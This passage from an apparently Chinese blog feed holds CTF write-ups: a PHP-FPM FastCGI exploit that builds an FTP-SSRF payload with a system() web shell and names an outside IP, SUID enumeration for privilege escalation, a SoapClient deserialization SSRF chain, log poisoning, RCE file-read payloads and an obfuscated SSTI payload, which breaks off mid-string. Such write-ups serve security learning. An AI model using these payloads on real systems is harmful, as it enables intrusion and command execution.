punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$paramsRequest</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$request</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">buildPacket</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">PARAMS</span><span class="token punctuation">,</span> <span class="token variable">$paramsRequest</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$request</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">buildPacket</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">PARAMS</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$stdin</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$request</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">buildPacket</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">STDIN</span><span class="token punctuation">,</span> <span class="token variable">$stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$request</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">buildPacket</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">STDIN</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'?file=ftp://ip:9999/&amp;data='</span><span class="token operator">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//        fwrite($this->_sock, $request);</span><span class="token comment">//        do &#123;</span><span class="token comment">//            $resp = $this->readPacket();</span><span class="token comment">//            if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) &#123;</span><span class="token comment">//                $response .= $resp['content'];</span><span class="token comment">//            &#125;</span><span class="token comment">//        &#125; while ($resp &amp;&amp; $resp['type'] != self::END_REQUEST);</span><span class="token comment">//        var_dump($resp);</span><span class="token comment">//        if (!is_array($resp)) &#123;</span><span class="token comment">//            throw new Exception('Bad request');</span><span class="token comment">//        &#125;</span><span class="token comment">//        switch (ord($resp['content']&#123;4&#125;)) &#123;</span><span class="token comment">//            case self::CANT_MPX_CONN:</span><span class="token comment">//                throw new Exception('This app can\'t multiplex [CANT_MPX_CONN]');</span><span class="token comment">//                break;</span><span class="token comment">//            case self::OVERLOADED:</span><span class="token comment">//                throw new Exception('New request rejected; too busy [OVERLOADED]');</span><span class="token comment">//                break;</span><span class="token comment">//            case self::UNKNOWN_ROLE:</span><span class="token comment">//                throw new Exception('Role value not known [UNKNOWN_ROLE]');</span><span class="token comment">//                break;</span><span class="token comment">//            case self::REQUEST_COMPLETE:</span><span class="token comment">//                return $response;</span><span class="token comment">//        &#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// real exploit start here</span><span class="token comment">//if (!isset($_REQUEST['cmd'])) &#123;</span><span class="token comment">//    die("Check your input\n");</span><span class="token comment">//&#125;</span><span class="token comment">//if (!isset($_REQUEST['filepath'])) &#123;</span><span class="token comment">//    $filepath = __FILE__;</span><span class="token comment">//&#125;else&#123;</span><span class="token comment">//    $filepath = $_REQUEST['filepath'];</span><span class="token comment">//&#125;</span><span class="token variable">$filepath</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/var/www/html/add_api.php"</span><span class="token punctuation">;</span><span class="token variable">$req</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$filepath</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$uri</span> <span class="token operator">=</span> <span class="token variable">$req</span> <span class="token operator">.</span><span class="token string single-quoted-string">'?'</span><span class="token operator">.</span><span class="token string single-quoted-string">'command=whoami'</span><span class="token punctuation">;</span><span class="token variable">$client</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FCGIClient</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"unix:///var/run/php-fpm.sock"</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"&lt;?php system(\$_REQUEST['command']); phpinfo(); ?>"</span><span class="token punctuation">;</span> <span class="token variable">$php_value</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"unserialize_callback_func = system\nextension_dir = /var/www/html\nextension = 1.so\ndisable_classes = \ndisable_functions = \nallow_url_include = On\nopen_basedir = /\nauto_prepend_file = "</span><span class="token punctuation">;</span>   <span class="token comment">//æ³¨æ„ä¿®æ”¹è¿™é‡Œçš„soæ–‡ä»¶åç§°å’Œè·¯å¾„</span><span class="token variable">$params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>    <span class="token string single-quoted-string">'GATEWAY_INTERFACE'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'FastCGI/1.0'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'REQUEST_METHOD'</span>    <span class="token operator">=></span> <span class="token string single-quoted-string">'POST'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'SCRIPT_FILENAME'</span>   <span class="token operator">=></span> <span class="token variable">$filepath</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'SCRIPT_NAME'</span>       <span class="token operator">=></span> <span class="token variable">$req</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'QUERY_STRING'</span>      <span class="token operator">=></span> <span class="token string single-quoted-string">'command=whoami'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'REQUEST_URI'</span>       <span class="token operator">=></span> <span class="token variable">$uri</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'DOCUMENT_URI'</span>      <span class="token operator">=></span> <span class="token variable">$req</span><span class="token punctuation">,</span><span class="token comment">#'DOCUMENT_ROOT'     => '/',</span>    <span class="token string single-quoted-string">'PHP_VALUE'</span>         <span class="token operator">=></span> <span class="token variable">$php_value</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'SERVER_SOFTWARE'</span>   <span class="token operator">=></span> <span class="token string single-quoted-string">'80sec/wofeiwo'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'REMOTE_ADDR'</span>       <span class="token operator">=></span> <span class="token string single-quoted-string">'127.0.0.1'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'REMOTE_PORT'</span>       <span class="token operator">=></span> <span class="token string single-quoted-string">'9001'</span><span class="token punctuation">,</span>    <span class="token comment">// æ³¨æ„è¿™é‡Œçš„FPMç«¯å£</span>    <span class="token string single-quoted-string">'SERVER_ADDR'</span>       <span class="token operator">=></span> <span class="token string single-quoted-string">'127.0.0.1'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'SERVER_PORT'</span>       <span class="token operator">=></span> <span class="token string single-quoted-string">'80'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'SERVER_NAME'</span>       <span class="token operator">=></span> <span class="token string single-quoted-string">'localhost'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'SERVER_PROTOCOL'</span>   <span class="token operator">=></span> <span class="token string single-quoted-string">'HTTP/1.1'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'CONTENT_LENGTH'</span>    <span class="token operator">=></span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// print_r($_REQUEST);</span><span class="token comment">// print_r($params);</span><span class="token comment">//echo "Call: $uri\n\n";</span><span class="token keyword">echo</span> <span class="token variable">$client</span><span class="token operator">-></span><span class="token function">request</span><span class="token punctuation">(</span><span class="token variable">$params</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç”Ÿæˆpayloadåè®¿é—®</p><pre class="line-numbers language-none"><code class="language-none">hack.php?file&#x3D;ftp:&#x2F;&#x2F;45.15.131.101:9999&#x2F;&amp;data&#x3D;%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%02%3F%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%80%00%00%B3PHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Ftmp%0Aextension+%3D+hpdoger.so%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9001%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åå¼¹shellæˆåŠŸï¼Œææƒï¼ŒæŸ¥çœ‹æœ‰suidçš„å‘½ä»¤</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-u</span><span class="token operator">=</span>s <span class="token parameter variable">-type</span> f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null/bin/mount/bin/su/bin/umount/usr/bin/chfn/usr/bin/chsh/usr/bin/gpasswd/usr/bin/newgrp/usr/bin/passwd/usr/local/bin/php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç”¨phpå‘½ä»¤è¡Œæ¨¡å¼ï¼ŒåŒæ ·å…ˆç»•è¿‡open_basedirï¼Œå†readfileè¯»å–flagå³å¯</p><h2 id="bestphpâ€™s-revenge"><a href="#bestphpâ€™s-revenge" class="headerlink" title="bestphpâ€™s revenge"></a>bestphpâ€™s revenge</h2><p>ä¸Šæ¥å°±æ˜¯ä¸€ä¸ªæºç </p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'implode'</span><span class="token punctuation">;</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token function">reset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'welcome_to_the_lctf2018'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//æ­¤å¤„å¦‚æœä¸æ›´æ”¹$bé‚£ä¹ˆå°±ä¼šç›´æ¥å°†$aåˆå¹¶ä¸ºå­—ç¬¦ä¸²ç„¶åè¿”å›</span><span class="token delimiter important">?></span></span>//è¿˜æœ‰ä¸€ä¸ªflag.phpsession_start();echo 'only localhost can get flag!';$flag = 'LCTF&#123;*************************&#125;';if($_SERVER["REMOTE_ADDR"]==="127.0.0.1")&#123;       $_SESSION['flag'] = $flag;   &#125;only localhost can get flag!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ˜æ˜¾æ˜¯SSRFäº†ï¼Œ<a href="https://jlan.darkflow.top/posts/210d3ac7.html#HFCTF2020-BabyUpload">[HFCTF2020]BabyUpload</a>è¿™é‡Œæœ‰phpçš„sessionå­˜å‚¨å¼•æ“ç›¸å…³å†…å®¹ï¼Œphpä¸­é»˜è®¤ä½¿ç”¨çš„æ˜¯PHPå¼•æ“ï¼Œä¿®æ”¹å¼•æ“ä½¿ç”¨<code>ini_set(&#39;session.serialize_handler&#39;, &#39;éœ€è¦è®¾ç½®çš„å¼•æ“&#39;);</code>å³å¯ä¿®æ”¹ï¼Œæ­¤å¤„æˆ‘ä»¬é€šè¿‡ä¸åŒçš„sessionå­˜å‚¨è¯»å–æ–¹æ³•å³å¯å¯¼è‡´ååºåˆ—åŒ–ï¼Œè€ŒSSRFåªéœ€è¦é€šè¿‡åŸç”Ÿç±»ä¸­çš„<code>SoapClient</code>ç±»ååºåˆ—åŒ–æ‰§è¡Œ<code>__call</code>æ–¹æ³•å°±è¡Œ</p><p>é¦–å…ˆæ„é€ <code>SoapClient</code>ç±»</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"http://127.0.0.1/flag.php"</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SoapClient</span><span class="token punctuation">(</span><span class="token constant">null</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'uri'</span> <span class="token operator">=></span> <span class="token variable">$url</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'location'</span> <span class="token operator">=></span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'^^'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\r\n"</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"|"</span> <span class="token operator">.</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åä¸Šä¼ ï¼Œä½¿å¾—ååºåˆ—åŒ–è¢«æ‰§è¡Œ</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;?f&#x3D;session_start&amp;name&#x3D;|O%3A10%3A%22SoapClient%22%3A3%3A%7Bs%3A3%3A%22uri%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7Dserialize_handler&#x3D;php_serialize<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>è°ƒç”¨ç±»ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•è§¦å‘<code>__call</code></p><pre class="line-numbers language-none"><code class="language-none">&#x2F;?f&#x3D;extract&amp;name&#x3D;SoapClientb&#x3D;call_user_func<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>var_dumpæŸ¥çœ‹SESSIONIDï¼Œæœ€ç»ˆæ”¹Cookieæ‹¿flag</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CTFshowé»‘ç›’æµ‹è¯•</title>
      <link href="/posts/c8094d2d.html"/>
      <url>/posts/c8094d2d.html</url>
      
        <content type="html"><![CDATA[<p><strong>380</strong></p><p>æ‰«ç›®å½•æ‰«é™¤page.phpæ–‡ä»¶</p><p>æ‰“å¼€æç¤ºæ–‡ä»¶ä¸å­˜åœ¨ï¼Œä¼ å‚åŒ…å«flag.php</p><p><strong>381</strong></p><pre class="line-numbers language-none"><code class="language-none">æ‰“å¼€page_$id.phpå¤±è´¥<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™æ¬¡å˜äº†ï¼Œç›®å½•ç©¿è¶Šèƒ½æ‹¿åˆ°æºç ï¼Œä½†æ²¡æœ‰ä»€ä¹ˆç”¨ï¼Œå›é¦–é¡µå‘ç°cssæ–‡ä»¶è·¯å¾„å¾ˆå¥‡æ€ªï¼Œè®¿é—®å¾—åˆ°flag</p><p><strong>382</strong></p><p>åŒä¸Šé¢˜ç›®å½•ï¼Œä¸è¿‡éœ€è¦ç™»å½•ï¼Œä¸‡èƒ½å¯†ç å³å¯</p><p><strong>383</strong></p><p>åŒä¸Š</p><p><strong>384</strong></p><p>æç¤ºï¼š<code>å¯†ç å‰2ä½æ˜¯å°å†™å­—æ¯ï¼Œåä¸‰ä½æ˜¯æ•°å­—</code></p><p>çˆ†ç ´å’¯ï¼Œç»“æœæ˜¯xy123</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Dest0g3 520è¿æ–°èµ›</title>
      <link href="/posts/41a3f068.html"/>
      <url>/posts/41a3f068.html</url>
      
        <content type="html"><![CDATA[<h2 id="phpdest"><a href="#phpdest" class="headerlink" title="phpdest"></a>phpdest</h2><p>åŒ…å«logæ–‡ä»¶æ”¹User-Agent</p><pre class="line-numbers language-none"><code class="language-none">payload:?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.logUser-Agent: &lt;?php var_dump($flag);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206011423203.png"></p><h2 id="EasyPHP"><a href="#EasyPHP" class="headerlink" title="EasyPHP"></a>EasyPHP</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"fl4g.php"</span><span class="token punctuation">;</span><span class="token variable">$dest0g3</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$time</span> <span class="token operator">=</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"H"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$timme</span> <span class="token operator">=</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"d"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$timmme</span> <span class="token operator">=</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"i"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$time</span> <span class="token operator">></span> <span class="token string double-quoted-string">"24"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token punctuation">(</span><span class="token variable">$timme</span> <span class="token operator">></span> <span class="token string double-quoted-string">"31"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token punctuation">(</span><span class="token variable">$timmme</span> <span class="token operator">></span> <span class="token string double-quoted-string">"60"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$fl4g</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Try harder!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">set_error_handler</span><span class="token punctuation">(</span>    <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">use</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$fl4g</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">print</span> <span class="token variable">$fl4g</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$fl4g</span> <span class="token operator">.=</span> <span class="token variable">$dest0g3</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>timeæ¡ä»¶æ˜¯ä¸å¯èƒ½æ»¡è¶³äº†ï¼Œçœ‹ä¸‹é¢çš„è‡ªå®šä¹‰é”™è¯¯å‡½æ•°ï¼Œåªéœ€è¦è®©ç¨‹åºäº§ç”Ÿé”™è¯¯å°±è¡Œï¼Œ.è¿ç®—ç”¨äºæ‹¼æ¥å­—ç¬¦ä¸²ï¼Œä¼ å…¥æ•°ç»„å³å¯</p><pre class="line-numbers language-none"><code class="language-none">payload:POSTctf[]&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206011423502.png"></p><h2 id="SimpleRCE"><a href="#SimpleRCE" class="headerlink" title="SimpleRCE"></a>SimpleRCE</h2><p>globåè®®å¾—åˆ°æ–‡ä»¶åï¼Œå†ä½¿ç”¨fopenæ‰“å¼€æ–‡ä»¶ï¼Œfreadè¯»å–å†…å®¹</p><pre class="line-numbers language-none"><code class="language-none">payload:POSTaaa&#x3D;echo(fread(fopen(end(glob(&#39;&#x2F;f*&#39;)),&#39;r&#39;),100));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206011423683.png"></p><h2 id="EasySSTI"><a href="#EasySSTI" class="headerlink" title="EasySSTI"></a>EasySSTI</h2><p>å…ˆç»™ä¸ªä¸€æ¬¡æ€§payload</p><pre class="line-numbers language-none"><code class="language-none">username&#x3D;&#123;%25set%0dpoint&#x3D;config|string|truncate(4)|last%25&#125;&#123;%25set%0dcxhx&#x3D;config|join|truncate(28)|replace(point,wu)|last%25&#125;&#123;%25set%0dca&#x3D;config|join|truncate(23)|replace(point,wu)|last|lower%25&#125;&#123;%25set%0dcb&#x3D;config|join|truncate(9)|replace(point,wu)|last|lower%25&#125;&#123;%25set%0dcc&#x3D;config|join|truncate(31)|replace(point,wu)|last|lower%25&#125;&#123;%25set%0dcd&#x3D;config|join|truncate(7)|replace(point,wu)|last|lower%25&#125;&#123;%25set%0dce&#x3D;config|join|truncate(4)|replace(point,wu)|last|lower%25&#125;&#123;%25set%0dcf&#x3D;config|join|truncate(98)|replace(point,wu)|last|lower%25&#125;&#123;%25set%0dcg&#x3D;config|join|truncate(11)|replace(point,wu)|last|lower%25&#125;&#123;%25set%0dch&#x3D;config|join|truncate(203)|replace(point,wu)|last|lower%25&#125;&#123;%25set%0dci&#x3D;config|join|truncate(16)|replace(point,wu)|last|lower%25&#125;&#123;%25set%0dcj&#x3D;config|join|truncate(429)|replace(point,wu)|last|lower%25&#125;&#123;%25set%0dck&#x3D;config|join|truncate(75)|replace(point,wu)|last|lower%25&#125;&#123;%25set%0dcl&#x3D;config|join|truncate(96)|replace(point,wu)|last|lower%25&#